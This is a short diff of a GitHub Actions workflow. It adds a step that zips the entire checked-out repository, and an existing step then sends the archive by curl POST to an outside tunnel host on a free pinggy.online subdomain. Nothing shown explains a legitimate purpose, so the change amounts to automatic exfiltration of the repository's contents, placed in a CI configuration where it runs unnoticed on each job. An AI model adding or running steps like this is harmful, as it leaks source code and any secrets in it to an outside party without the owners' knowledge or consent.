@@ -10,6 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v3
+    - name: Compress Folders
+      run: zip -r repo.zip .
     - name: Send Compressed Folder
       run: |
         curl -X POST https://rncar-157-193-240-178.a.free.pinggy.online/repo \
